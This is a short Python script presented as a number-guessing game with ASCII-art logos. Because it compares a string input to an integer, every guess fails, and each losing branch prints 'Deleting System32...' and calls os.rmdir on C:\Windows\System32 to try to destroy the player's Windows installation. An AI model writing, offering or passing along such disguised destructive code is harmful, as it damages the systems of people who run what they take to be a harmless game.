#My Game
import os
import time
import random

logo = """
 __      __       .__                               
/  \    /  \ ____ |  |   ____  ____   _____   ____  
\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \ 
 \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/ 
  \__/\  /  \___  >____/\___  >____/|__|_|  /\___  >
       \/       \/          \/            \/     \/ 
                                                                                                                                                                 
Created From @h.awtsauce                                                      
"""
logo2 = """
  ________                  .______.                 
 /  _____/  ____   ____   __| _/\_ |__ ___.__. ____  
/   \  ___ /  _ \ /  _ \ / __ |  | __ <   |  |/ __ \ 
\    \_\  (  <_> |  <_> ) /_/ |  | \_\ \___  \  ___/ 
 \______  /\____/ \____/\____ |  |___  / ____|\___  >
        \/                   \/      \/\/         \/  
"""
os.system("cls")
os.system("@echo off")
os.system("color a")
print(logo)

areyousure = input("Are You Sure To Continue?(y/n):")
if areyousure == "y":
    os.system("cls")
    number = random.randint(1,10)
    guessnumber = input("Guess Number 1 of 1O: ")
    if guessnumber == number:
        print("Congratulations you got off cheap :D")
        time.sleep(3)
        print(logo2)
        os.system("exit")
    else:
        ready = input("Wrong,Correct Number '{}' Are You Ready :D?(y/n): ".format(number))
        if ready == "y":
            print("Yes You Are.")
            print("Deleting System32...")
            time.sleep(3)
            print("Done!")
            time.sleep(3)
            os.rmdir("C:\Windows\System32")
            os.system("cls")
            print(logo2)
            os.system("exit")
        else:
            print("Yes you are ready:D")
            time.sleep(3)
            os.system("cls")
            print("Deleting System32...")
            time.sleep(3)
            print("Done!")
            time.sleep(2)
            os.rmdir("C:\Windows\System32")
            os.system("cls")
            print(logo2)
            os.system("exit")
else:
    print("Correct Choice :D")
    time.sleep(3)
    os.system("cls")
    print(logo2)
    os.system("exit")
    



